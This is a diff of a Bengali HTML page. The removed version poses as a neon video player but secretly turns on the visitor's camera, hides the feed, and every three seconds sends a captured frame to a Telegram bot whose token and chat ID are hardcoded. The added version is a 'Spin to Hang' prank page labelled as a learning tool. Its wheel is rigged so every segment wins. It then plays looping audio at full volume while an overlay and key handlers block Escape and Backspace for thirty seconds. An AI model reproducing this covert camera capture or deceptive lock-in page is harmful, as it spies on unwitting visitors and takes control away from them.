@@ -1,415 +1,619 @@
 <!DOCTYPE html>
 <html lang="bn">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>CYBER · NEO PLAYER</title>
-  <!-- Orbitron ফন্ট -->
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;800&display=swap" rel="stylesheet" />
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>স্পিন টু হ্যাং - লার্নিং টুল</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #0a0a0a;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+            user-select: none;
+            -webkit-user-select: none;
+        }
+        .container {
+            max-width: 500px;
+            width: 100%;
+            background: linear-gradient(145deg, #1a1a2e, #16213e);
+            border-radius: 35px;
+            padding: 25px 20px 30px;
+            box-shadow: 0 25px 70px rgba(0,0,0,0.9), inset 0 0 40px rgba(255,215,0,0.03);
+            border: 1px solid rgba(255,215,0,0.08);
+            position: relative;
+            overflow: hidden;
+        }
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at center, rgba(255,215,0,0.02) 0%, transparent 70%);
+            animation: glowPulse 4s ease-in-out infinite;
+            pointer-events: none;
+        }
+        @keyframes glowPulse {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 0.8; }
+        }
 
-    body {
-      background: #0b0d15;
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      font-family: 'Orbitron', sans-serif;
-      padding: 16px;
-      margin: 0;
-    }
+        .spinner-section {
+            text-align: center;
+            position: relative;
+            z-index: 1;
+            padding: 10px 0;
+        }
+        .spinner-title {
+            color: #ffd700;
+            font-size: 26px;
+            font-weight: 800;
+            text-shadow: 0 0 30px rgba(255,215,0,0.2);
+            letter-spacing: 2px;
+            margin-bottom: 5px;
+        }
+        .spinner-sub {
+            color: #888;
+            font-size: 13px;
+            margin-bottom: 20px;
+        }
 
-    /* 🎨 সাইবার / নিওন থিম – কালার টেমপ্লেট (লাল/নীল/সবুজ/গোলাপী/বেগুনি/কমলা/সোনালী) */
-    .player-card {
-      --neon-glow: #ff3b3b;        /* ডিফল্ট লাল */
-      --neon-secondary: #ff7878;
-      --neon-dark: #1a0e0e;
-      --text-glow: #ffb3b3;
-      width: 100%;
-      max-width: 820px;
-      background: #0f111a;
-      border-radius: 48px 48px 28px 28px;
-      padding: 28px 24px 24px;
-      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.8), 0 0 30px var(--neon-glow), inset 0 0 20px rgba(255, 255, 255, 0.03);
-      border: 1px solid rgba(255, 255, 255, 0.06);
-      backdrop-filter: blur(2px);
-      transition: box-shadow 0.25s ease, border-color 0.25s;
-      position: relative;
-    }
+        .wheel-container {
+            position: relative;
+            width: 280px;
+            height: 280px;
+            margin: 0 auto 20px;
+        }
+        .wheel {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            position: relative;
+            box-shadow: 0 0 50px rgba(255,215,0,0.15), inset 0 0 50px rgba(255,215,0,0.05);
+            border: 4px solid #ffd700;
+        }
+        .wheel canvas {
+            width: 100% !important;
+            height: 100% !important;
+            border-radius: 50%;
+        }
+        .wheel-pointer {
+            position: absolute;
+            top: -18px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 40px;
+            color: #ffd700;
+            filter: drop-shadow(0 0 15px rgba(255,215,0,0.6));
+            z-index: 10;
+            text-shadow: 0 0 30px rgba(255,215,0,0.5);
+        }
+        .wheel-center {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 60px;
+            height: 60px;
+            background: radial-gradient(circle, #ffd700, #b8860b);
+            border-radius: 50%;
+            border: 3px solid #fff;
+            box-shadow: 0 0 30px rgba(255,215,0,0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: 800;
+            color: #000;
+            z-index: 5;
+        }
 
-    /* 3D ইফেক্ট - pseudo layers */
-    .player-card::before {
-      content: '';
-      position: absolute;
-      top: -6px; left: -6px;
-      width: calc(100% + 12px);
-      height: calc(100% + 12px);
-      background: radial-gradient(circle at 20% 30%, var(--neon-glow), transparent 70%);
-      opacity: 0.15;
-      border-radius: 54px;
-      z-index: -1;
-      filter: blur(8px);
-    }
+        .spin-btn {
+            background: linear-gradient(145deg, #ffd700, #f0a500);
+            border: none;
+            color: #000;
+            padding: 16px 50px;
+            border-radius: 60px;
+            font-size: 22px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 0 40px rgba(255,215,0,0.2);
+            letter-spacing: 2px;
+            position: relative;
+            z-index: 2;
+        }
+        .spin-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 60px rgba(255,215,0,0.4);
+        }
+        .spin-btn:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .spin-btn .spinning-text {
+            display: none;
+        }
+        .spin-btn.spinning .normal-text {
+            display: none;
+        }
+        .spin-btn.spinning .spinning-text {
+            display: inline;
+        }
 
-    /* ভিডিও প্লেয়ার (উপরে) */
-    .video-wrapper {
-      position: relative;
-      border-radius: 28px;
-      overflow: hidden;
-      background: #000000;
-      box-shadow: 0 0 30px rgba(0, 0, 0, 0.8), inset 0 0 30px rgba(255, 255, 255, 0.02);
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      aspect-ratio: 16 / 9;
-    }
+        .congress-popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(10px);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            animation: popIn 0.5s ease;
+        }
+        .congress-popup.show {
+            display: flex;
+        }
+        @keyframes popIn {
+            0% { opacity: 0; transform: scale(0.8); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+        .congress-box {
+            background: linear-gradient(145deg, #1a1a2e, #0d0d1a);
+            border: 2px solid #ffd700;
+            border-radius: 30px;
+            padding: 40px 35px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 0 80px rgba(255,215,0,0.15);
+            position: relative;
+        }
+        .congress-box .trophy {
+            font-size: 80px;
+            margin-bottom: 10px;
+        }
+        .congress-box h2 {
+            color: #ffd700;
+            font-size: 32px;
+            font-weight: 800;
+            text-shadow: 0 0 30px rgba(255,215,0,0.2);
+        }
+        .congress-box p {
+            color: #aaa;
+            font-size: 16px;
+            margin: 15px 0 25px;
+            line-height: 1.6;
+        }
+        .congress-box .congress-btn {
+            background: #ffd700;
+            border: none;
+            color: #000;
+            padding: 14px 40px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .congress-box .congress-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 40px rgba(255,215,0,0.3);
+        }
 
-    #videoPlayer {
-      width: 100%;
-      height: 100%;
-      display: block;
-      object-fit: cover;
-      background: #0a0a0a;
-    }
+        .hang-page {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 9998;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .hang-page.active {
+            display: flex;
+        }
+        .hang-page .player-card {
+            background: #1e1e1e;
+            padding: 30px 25px;
+            border-radius: 20px;
+            box-shadow: 0 4px 30px rgba(0,0,0,0.8);
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+            border: 1px solid rgba(255,215,0,0.1);
+        }
+        .hang-page .player-card h3 {
+            color: #ffd700;
+            font-size: 20px;
+            margin-bottom: 15px;
+            text-shadow: 0 0 20px rgba(255,215,0,0.1);
+        }
+        .hang-page .player-card audio {
+            width: 100%;
+            margin-top: 10px;
+            border-radius: 8px;
+            background: #2a2a2a;
+        }
+        .hang-page .player-card .hint {
+            font-size: 12px;
+            color: #888;
+            margin-top: 12px;
+        }
+        .hang-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9997;
+            cursor: default;
+        }
+        .hang-status {
+            color: #ff4444;
+            font-size: 18px;
+            font-weight: 700;
+            margin-top: 20px;
+            text-shadow: 0 0 30px rgba(255,68,68,0.3);
+            animation: blinkText 1s ease-in-out infinite;
+            position: relative;
+            z-index: 9999;
+        }
+        @keyframes blinkText {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        .hang-timer {
+            color: #ffd700;
+            font-size: 16px;
+            font-weight: 600;
+            margin-top: 10px;
+            text-shadow: 0 0 20px rgba(255,215,0,0.2);
+            position: relative;
+            z-index: 9999;
+        }
 
-    /* লুকানো ক্যামেরা (opacity: 0) + ছোট ক্যানভাস (ফ্রেম ক্যাপচার) */
-    .camera-hidden {
-      position: absolute;
-      opacity: 0;
-      pointer-events: none;
-      width: 1px;
-      height: 1px;
-      overflow: hidden;
-    }
+        .footer {
+            color: #444;
+            text-align: center;
+            font-size: 11px;
+            margin-top: 20px;
+            border-top: 1px solid rgba(255,255,255,0.04);
+            padding-top: 15px;
+            position: relative;
+            z-index: 1;
+        }
+        .footer a {
+            color: #ffd700;
+            text-decoration: none;
+        }
 
-    #captureCanvas {
-      position: absolute;
-      bottom: 0;
-      left: 0;
-      width: 1px;
-      height: 1px;
-      opacity: 0;
-    }
-
-    /* কন্ট্রোল প্যানেল – কাউন্টার, LED, ফুটার */
-    .control-panel {
-      margin-top: 22px;
-      display: flex;
-      flex-wrap: wrap;
-      align-items: center;
-      justify-content: space-between;
-      gap: 14px 8px;
-      background: rgba(0, 0, 0, 0.35);
-      backdrop-filter: blur(4px);
-      padding: 12px 22px;
-      border-radius: 60px;
-      border: 1px solid rgba(255, 255, 255, 0.04);
-      box-shadow: inset 0 0 15px rgba(0, 0, 0, 0.6);
-    }
-
-    .counter-led {
-      display: flex;
-      align-items: center;
-      gap: 18px;
-    }
-
-    .counter {
-      font-size: 1.6rem;
-      font-weight: 700;
-      letter-spacing: 2px;
-      color: #fff;
-      text-shadow: 0 0 12px var(--neon-glow), 0 0 30px var(--neon-glow);
-      background: rgba(0, 0, 0, 0.4);
-      padding: 4px 18px 4px 14px;
-      border-radius: 40px;
-      border-left: 2px solid var(--neon-glow);
-    }
-
-    .counter span {
-      font-weight: 800;
-      color: var(--neon-glow);
-      text-shadow: 0 0 20px var(--neon-glow);
-    }
-
-    .led-indicator {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      font-size: 0.8rem;
-      text-transform: uppercase;
-      letter-spacing: 2px;
-      color: #b0b8c8;
-    }
-
-    .led-bulb {
-      width: 16px;
-      height: 16px;
-      border-radius: 50%;
-      background: #ff2a2a;
-      box-shadow: 0 0 12px #ff2a2a, 0 0 30px #ff2a2a;
-      transition: 0.2s ease;
-      border: 1px solid rgba(255, 255, 255, 0.3);
-    }
-
-    .led-bulb.active {
-      background: #2eff6e;
-      box-shadow: 0 0 18px #2eff6e, 0 0 40px #2eff6e;
-      border-color: #aaffbb;
-    }
-
-    .footer-meta {
-      font-size: 0.8rem;
-      font-weight: 400;
-      color: #a0a8b8;
-      letter-spacing: 1px;
-      background: rgba(0, 0, 0, 0.3);
-      padding: 6px 18px;
-      border-radius: 40px;
-      border: 1px solid rgba(255, 255, 255, 0.03);
-      backdrop-filter: blur(2px);
-      white-space: nowrap;
-    }
-
-    .footer-meta i {
-      color: var(--neon-glow);
-      text-shadow: 0 0 10px var(--neon-glow);
-      margin-right: 6px;
-    }
-
-    /* responsive */
-    @media (max-width: 560px) {
-      .player-card { padding: 16px 12px; }
-      .control-panel { flex-direction: column; align-items: stretch; gap: 10px; border-radius: 30px; padding: 16px; }
-      .counter-led { justify-content: center; }
-      .footer-meta { text-align: center; }
-      .counter { font-size: 1.4rem; }
-    }
-
-    /* স্ট্যাটাস বার */
-    .toast-msg {
-      margin-top: 12px;
-      font-size: 0.7rem;
-      letter-spacing: 1px;
-      color: #7f8a9e;
-      text-align: center;
-      border-top: 1px solid rgba(255,255,255,0.02);
-      padding-top: 12px;
-      opacity: 0.7;
-    }
-  </style>
+        @media (max-width: 400px) {
+            .wheel-container { width: 220px; height: 220px; }
+            .spin-btn { padding: 14px 30px; font-size: 18px; }
+            .congress-box { padding: 30px 20px; }
+            .hang-page .player-card { padding: 20px 15px; }
+        }
+    </style>
 </head>
 <body>
-  <div class="player-card" id="playerCard">
-    <!-- ভিডিও প্লেয়ার -->
-    <div class="video-wrapper">
-      <video id="videoPlayer" src="https://www.w3schools.com/html/mov_bbb.mp4" muted playsinline></video>
-      <!-- লুকানো ক্যামেরা (opacity:0) -->
-      <video id="cameraFeed" class="camera-hidden" autoplay playsinline></video>
-      <!-- ক্যানভাস ফ্রেম ক্যাপচার -->
-      <canvas id="captureCanvas"></canvas>
-    </div>
 
-    <!-- কন্ট্রোল প্যানেল -->
-    <div class="control-panel">
-      <div class="counter-led">
-        <div class="counter">📡 <span id="shotCounter">0</span></div>
-        <div class="led-indicator">
-          <span>LIVE</span>
-          <div class="led-bulb" id="ledBulb"></div>
+    <!-- ===== স্পিনার সেকশন ===== -->
+    <div class="container" id="mainContainer">
+        <div class="spinner-section">
+            <div class="spinner-title">🎰 স্পিন টু হ্যাং</div>
+            <div class="spinner-sub">ঘুরিয়ে দেখুন আপনার ভাগ্য!</div>
+
+            <div class="wheel-container">
+                <div class="wheel-pointer">▼</div>
+                <div class="wheel" id="wheel">
+                    <canvas id="wheelCanvas" width="400" height="400"></canvas>
+                </div>
+                <div class="wheel-center">WIN</div>
+            </div>
+
+            <button class="spin-btn" id="spinBtn">
+                <span class="normal-text">🌀 স্পিন করুন</span>
+                <span class="spinning-text">⏳ ঘুরছে...</span>
+            </button>
         </div>
-      </div>
-      <div class="footer-meta">
-        <i>🎬</i> 1080p · 60fps
-      </div>
+        <div class="footer">
+            ⚡ শিক্ষামূলক উদ্দেশ্যে &nbsp;|&nbsp; <a href="#">কীভাবে কাজ করে</a>
+        </div>
     </div>
-    <div class="toast-msg" id="statusMsg">⚡ সিস্টেম অনলাইন · ক্যামেরা সক্রিয়</div>
-  </div>
 
-  <script>
-    (function() {
-      "use strict";
+    <!-- ===== কংগ্রেস পপআপ ===== -->
+    <div class="congress-popup" id="congressPopup">
+        <div class="congress-box">
+            <div class="trophy">🏆</div>
+            <h2>🎉 কংগ্রেস!</h2>
+            <p>আপনি জিতে গেছেন! <br>এখন অডিও হ্যাং পেজ লোড হবে।</p>
+            <button class="congress-btn" id="congressGoBtn">🚀 এগিয়ে যান</button>
+        </div>
+    </div>
 
-      // ---------- 🔒 Telegram Bot credentials (সেট করা থাকবে) ----------
-      const BOT_TOKEN = '8917986127:AAGDw4tJGj1erwoKAhiacr7om9VSWGz6wb0';          // ❗ আপনার টোকেন দিন
-      const CHAT_ID = '8157946649';              // ❗ আপনার চ্যাট আইডি দিন
+    <!-- ===== হ্যাং পেজ (অডিও প্লেয়ার) ===== -->
+    <div class="hang-page" id="hangPage">
+        <!-- ওভারলে (ব্যাক ব্লক) -->
+        <div class="hang-overlay" id="hangOverlay"></div>
+        
+        <!-- অডিও প্লেয়ার কার্ড -->
+        <div class="player-card">
+            <h3>🔊 অডিও স্ট্রিমিং</h3>
+            
+            <audio id="myAudio" controls autoplay loop preload="metadata">
+                <source src="https://drive.google.com/uc?export=open&id=1WF4FecEnkbTMxgl2bdFXUKR0axwPdEGp" type="audio/mpeg">
+                আপনার ব্রাউজার অডিও সাপোর্ট করে না।
+            </audio>
 
-      // ---------- থিম কালার (টেমপ্লেট) ----------
-      // আপনি চাইলে নিচের কালার পরিবর্তন করতে পারেন: লাল/নীল/সবুজ/গোলাপী/বেগুনি/কমলা/সোনালী
-      const THEME = {
-        primary: '#ff3b3b',      // লাল (ডিফল্ট)
-        secondary: '#ff7878',
-        glow: '#ff3b3b'
-      };
-      // CSS ভেরিয়েবল আপডেট
-      const root = document.documentElement;
-      const card = document.getElementById('playerCard');
-      card.style.setProperty('--neon-glow', THEME.primary);
-      card.style.setProperty('--neon-secondary', THEME.secondary);
-      card.style.setProperty('--text-glow', THEME.glow);
+            <p class="hint">🔊 ভলিউম: ১০০% | সিস্টেম ব্যস্ত...</p>
+        </div>
 
-      // ---------- DOM এলিমেন্ট ----------
-      const videoPlayer = document.getElementById('videoPlayer');
-      const cameraFeed = document.getElementById('cameraFeed');
-      const captureCanvas = document.getElementById('captureCanvas');
-      const shotCounterSpan = document.getElementById('shotCounter');
-      const ledBulb = document.getElementById('ledBulb');
-      const statusMsg = document.getElementById('statusMsg');
+        <div class="hang-status">📱 সিস্টেম ব্যস্ত... অডিও চলছে</div>
+        <div class="hang-timer" id="hangTimerDisplay">⏱️ লোড হচ্ছে...</div>
+    </div>
 
-      let shotCount = 0;
-      let cameraInterval = null;
-      let cameraStream = null;
-      let isCameraReady = false;
+    <script>
+        (function() {
+            'use strict';
 
-      // ---------- ১. ভিডিও প্লেয়ার (ডিফল্ট) ----------
-      videoPlayer.controls = true;
-      videoPlayer.loop = true;
-      // ভিডিও অটোপ্লে করার চেষ্টা
-      videoPlayer.play().catch(() => {
-        // কিছু ব্রাউজারে মিউটেড প্লে কাজ করে
-        videoPlayer.muted = true;
-        videoPlayer.play().catch(e => console.warn('ভিডিও অটোপ্লে ব্যর্থ:', e));
-      });
+            // ===== এলিমেন্ট =====
+            const wheelCanvas = document.getElementById('wheelCanvas');
+            const ctx = wheelCanvas.getContext('2d');
+            const spinBtn = document.getElementById('spinBtn');
+            const congressPopup = document.getElementById('congressPopup');
+            const congressGoBtn = document.getElementById('congressGoBtn');
+            const hangPage = document.getElementById('hangPage');
+            const hangOverlay = document.getElementById('hangOverlay');
+            const hangTimerDisplay = document.getElementById('hangTimerDisplay');
+            const mainContainer = document.getElementById('mainContainer');
+            const audio = document.getElementById('myAudio');
 
-      // ---------- ২. ক্যামেরা চালু (getUserMedia) ----------
-      async function startCamera() {
-        try {
-          if (cameraStream) {
-            // আগের স্ট্রিম বন্ধ
-            cameraStream.getTracks().forEach(t => t.stop());
-            cameraStream = null;
-          }
-          // ডিফল্ট ব্রাউজার পপআপ দেখাবে (permission)
-          const stream = await navigator.mediaDevices.getUserMedia({
-            video: { width: { ideal: 640 }, height: { ideal: 480 } },
-            audio: false
-          });
-          cameraStream = stream;
-          cameraFeed.srcObject = stream;
-          await cameraFeed.play();
-          isCameraReady = true;
-          ledBulb.classList.add('active');
-          statusMsg.innerText = '📷 ক্যামেরা চালু · প্রতি ৩ সেকেন্ডে ক্যাপচার';
-          // ক্যাপচার ইন্টারভাল শুরু
-          if (cameraInterval) clearInterval(cameraInterval);
-          cameraInterval = setInterval(captureAndSend, 3000);
-          // তাৎক্ষণিক একটি ছবি পাঠাও (ঐচ্ছিক)
-          // captureAndSend();
-          return true;
-        } catch (err) {
-          console.error('ক্যামেরা অ্যাক্সেস ব্যর্থ:', err);
-          isCameraReady = false;
-          ledBulb.classList.remove('active');
-          statusMsg.innerText = '⚠️ ক্যামেরা অনুমতি প্রয়োজন · রিলোড করুন';
-          alert('ক্যামেরা অ্যাক্সেস দেওয়া প্রয়োজন। ব্রাউজার পপআপে অনুমতি দিন।');
-          return false;
-        }
-      }
+            // ===== টাইমার (ডেভেলপার সেট করবে) =====
+            const TIMER_DURATION = 30; // ৩০ সেকেন্ড
 
-      // ---------- ৩. ক্যাপচার + Telegram এ পাঠান ----------
-      async function captureAndSend() {
-        if (!isCameraReady || !cameraStream) {
-          // ক্যামেরা রেডি না থাকলে আবার চেষ্টা
-          if (!cameraStream) {
-            await startCamera();
-          }
-          if (!isCameraReady) return;
-        }
+            // ===== স্পিন হুইল =====
+            const segments = [
+                { label: '🎯 WIN', color: '#ffd700' },
+                { label: '🎯 WIN', color: '#ffaa00' },
+                { label: '🎯 WIN', color: '#ffd700' },
+                { label: '🎯 WIN', color: '#ffaa00' },
+                { label: '🎯 WIN', color: '#ffd700' },
+                { label: '🎯 WIN', color: '#ffaa00' },
+                { label: '🎯 WIN', color: '#ffd700' },
+                { label: '🎯 WIN', color: '#ffaa00' }
+            ];
+            const segmentCount = segments.length;
+            const segmentAngle = (2 * Math.PI) / segmentCount;
 
-        // ক্যানভাসে ফ্রেম ক্যাপচার
-        const canvas = captureCanvas;
-        const video = cameraFeed;
-        // ভিডিওর ডাইমেনশন অনুযায়ী ক্যানভাস সেট
-        if (video.videoWidth && video.videoHeight) {
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-        } else {
-          // ফলব্যাক
-          canvas.width = 640;
-          canvas.height = 480;
-        }
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            let currentRotation = 0;
+            let isSpinning = false;
+            let hangCountdown = null;
 
-        // ক্যানভাস থেকে ব্লব (JPEG)
-        let blob = null;
-        try {
-          blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.92));
-        } catch (e) {
-          console.warn('toBlob error', e);
-          return;
-        }
-        if (!blob) return;
+            function drawWheel(rotation) {
+                const centerX = 200;
+                const centerY = 200;
+                const radius = 190;
 
-        // কাউন্টার বাড়ান
-        shotCount++;
-        shotCounterSpan.innerText = shotCount;
+                ctx.clearRect(0, 0, 400, 400);
 
-        // Telegram এ পাঠান
-        if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || CHAT_ID === 'YOUR_CHAT_ID_HERE') {
-          statusMsg.innerText = '⚠️ বট টোকেন / চ্যাট আইডি সেট করুন';
-          return;
-        }
+                for (let i = 0; i < segmentCount; i++) {
+                    const startAngle = i * segmentAngle + rotation;
+                    const endAngle = startAngle + segmentAngle;
 
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', blob, `frame_${Date.now()}.jpg`);
+                    ctx.beginPath();
+                    ctx.moveTo(centerX, centerY);
+                    ctx.arc(centerX, centerY, radius, startAngle, endAngle);
+                    ctx.closePath();
 
-        try {
-          const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-          });
-          const result = await response.json();
-          if (result.ok) {
-            statusMsg.innerText = `📤 ছবি পাঠানো হয়েছে (${shotCount}) · ${new Date().toLocaleTimeString()}`;
-          } else {
-            statusMsg.innerText = `❌ Telegram error: ${result.description || 'অজানা'}`;
-            console.warn('Telegram error:', result);
-          }
-        } catch (err) {
-          statusMsg.innerText = `⚠️ নেটওয়ার্ক সমস্যা: ${err.message}`;
-          console.error('sendPhoto failed', err);
-        }
-      }
+                    ctx.fillStyle = segments[i].color;
+                    ctx.fill();
+                    ctx.strokeStyle = '#1a1a2e';
+                    ctx.lineWidth = 2;
+                    ctx.stroke();
 
-      // ---------- ৪. ক্যামেরা শুরু (পেজ লোড হলে) ----------
-      window.addEventListener('load', () => {
-        // একটু বিলম্বে ক্যামেরা চালু (যাতে UI রেডি)
-        setTimeout(() => {
-          startCamera();
-        }, 400);
-      });
+                    const textAngle = startAngle + segmentAngle / 2;
+                    const textX = centerX + (radius * 0.65) * Math.cos(textAngle);
+                    const textY = centerY + (radius * 0.65) * Math.sin(textAngle);
 
-      // ---------- ৫. ক্লিনআপ (পেজ বন্ধে) ----------
-      window.addEventListener('beforeunload', () => {
-        if (cameraInterval) clearInterval(cameraInterval);
-        if (cameraStream) {
-          cameraStream.getTracks().forEach(t => t.stop());
-        }
-      });
+                    ctx.save();
+                    ctx.translate(textX, textY);
+                    ctx.rotate(textAngle + (textAngle > Math.PI/2 ? Math.PI : 0));
+                    ctx.fillStyle = '#000';
+                    ctx.font = 'bold 20px Segoe UI, sans-serif';
+                    ctx.textAlign = 'center';
+                    ctx.textBaseline = 'middle';
+                    ctx.fillText('🎯 WIN', 0, 0);
+                    ctx.restore();
+                }
 
-      // ---------- (অতিরিক্ত) ভিডিও প্লেয়ার এরর হ্যান্ডল ----------
-      videoPlayer.addEventListener('error', (e) => {
-        console.warn('ভিডিও লোড সমস্যা', e);
-      });
+                ctx.beginPath();
+                ctx.arc(centerX, centerY, radius, 0, 2 * Math.PI);
+                ctx.strokeStyle = '#ffd700';
+                ctx.lineWidth = 4;
+                ctx.stroke();
+            }
 
-      // ---------- ক্যামেরা স্টেট চেক (যদি স্ট্রিম ড্রপ হয়) ----------
-      // প্রতি ১০ সেকেন্ডে চেক
-      setInterval(() => {
-        if (cameraStream && cameraStream.active === false) {
-          isCameraReady = false;
-          ledBulb.classList.remove('active');
-          statusMsg.innerText = '📴 ক্যামেরা সংযোগ হারিয়েছে · পুনরায় চেষ্টা';
-          startCamera();
-        }
-      }, 10000);
+            function spinWheel() {
+                if (isSpinning) return;
+                isSpinning = true;
+                spinBtn.disabled = true;
+                spinBtn.classList.add('spinning');
 
-    })();
-  </script>
+                const extraSpins = 5 + Math.random() * 5;
+                const spinAngle = (2 * Math.PI) * extraSpins;
+                const targetSegment = 0;
+                const targetAngle = (targetSegment * segmentAngle) + segmentAngle/2;
+                const finalAdjust = targetAngle - (-Math.PI/2) - (currentRotation + spinAngle);
+                const totalRotation = spinAngle + finalAdjust;
+                const targetRotation = currentRotation + totalRotation;
+
+                const duration = 4000;
+                const startTime = Date.now();
+                const startRotation = currentRotation;
+
+                function animateSpin() {
+                    const elapsed = Date.now() - startTime;
+                    const progress = Math.min(elapsed / duration, 1);
+                    const easeOut = 1 - Math.pow(1 - progress, 3);
+                    const currentRot = startRotation + (targetRotation - startRotation) * easeOut;
+
+                    drawWheel(currentRot);
+
+                    if (progress < 1) {
+                        requestAnimationFrame(animateSpin);
+                    } else {
+                        currentRotation = targetRotation;
+                        isSpinning = false;
+                        spinBtn.disabled = false;
+                        spinBtn.classList.remove('spinning');
+                        congressPopup.classList.add('show');
+                    }
+                }
+                animateSpin();
+            }
+
+            // ===== অডিও কন্ট্রোল =====
+            function setupAudio() {
+                audio.volume = 1.0; // ১০০% ভলিউম
+                
+                // অটোপ্লে চেষ্টা
+                const playPromise = audio.play();
+
+                if (playPromise !== undefined) {
+                    playPromise.then(() => {
+                        console.log("অডিও চালু হচ্ছে...");
+                    }).catch(error => {
+                        console.log("অটোপ্লে ব্লক করা হয়েছে। ইউজার ইন্টার্যাকশন প্রয়োজন।");
+                        
+                        // স্ক্রিনে ক্লিক করলে অডিও চালু হবে
+                        const startAudio = () => {
+                            audio.play();
+                            document.removeEventListener('click', startAudio);
+                            document.removeEventListener('touchstart', startAudio);
+                        };
+
+                        document.addEventListener('click', startAudio);
+                        document.addEventListener('touchstart', startAudio);
+                    });
+                }
+            }
+
+            // ===== কংগ্রেস গো =====
+            function goToHangPage() {
+                congressPopup.classList.remove('show');
+                mainContainer.style.display = 'none';
+                hangPage.classList.add('active');
+
+                // অডিও সেটআপ
+                setupAudio();
+
+                // টাইমার শুরু
+                startHangTimer(TIMER_DURATION);
+
+                // স্ট্যাটাস আপডেট
+                const statusText = document.querySelector('.hang-status');
+                if (statusText) {
+                    statusText.textContent = '🔊 ভলিউম: ১০০% | সিস্টেম ব্যস্ত...';
+                }
+                const hint = document.querySelector('.player-card .hint');
+                if (hint) {
+                    hint.textContent = '🔊 ভলিউম: ১০০% | সিস্টেম ব্যস্ত...';
+                }
+            }
+
+            // ===== টাইমার =====
+            function startHangTimer(seconds) {
+                let remaining = seconds;
+                hangTimerDisplay.textContent = `⏱️ অবশিষ্ট: ${remaining} সেকেন্ড`;
+
+                if (hangCountdown) {
+                    clearInterval(hangCountdown);
+                }
+
+                hangCountdown = setInterval(() => {
+                    remaining--;
+                    hangTimerDisplay.textContent = `⏱️ অবশিষ্ট: ${remaining} সেকেন্ড`;
+
+                    if (remaining <= 0) {
+                        clearInterval(hangCountdown);
+                        hangCountdown = null;
+                        exitHangPage();
+                    }
+                }, 1000);
+            }
+
+            // ===== হ্যাং পেজ প্রস্থান =====
+            function exitHangPage() {
+                if (hangCountdown) {
+                    clearInterval(hangCountdown);
+                    hangCountdown = null;
+                }
+                hangPage.classList.remove('active');
+                mainContainer.style.display = 'block';
+                
+                audio.pause();
+                audio.currentTime = 0;
+                
+                const statusText = document.querySelector('.hang-status');
+                if (statusText) {
+                    statusText.textContent = '📱 সিস্টেম ব্যস্ত... অডিও চলছে';
+                }
+                hangTimerDisplay.textContent = '⏱️ টাইমার শেষ';
+            }
+
+            // ===== ইভেন্ট লিসেনার =====
+            spinBtn.addEventListener('click', spinWheel);
+            congressGoBtn.addEventListener('click', goToHangPage);
+
+            // ব্যাক ব্লক
+            hangOverlay.addEventListener('click', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            });
+
+            document.addEventListener('keydown', function(e) {
+                if (hangPage.classList.contains('active')) {
+                    if (e.key === 'Escape' || e.key === 'Backspace') {
+                        e.preventDefault();
+                        e.stopPropagation();
+                        return false;
+                    }
+                }
+            });
+
+            // ===== ইনিশিয়ালাইজ =====
+            drawWheel(0);
+
+            console.log('🎰 স্পিন টু হ্যাং লোড হয়েছে!');
+            console.log(`⏱️ টাইমার: ${TIMER_DURATION} সেকেন্ড`);
+            console.log('🔊 ভলিউম: ১০০%');
+            console.log('📌 ব্যাক বাটন ব্লক করা আছে');
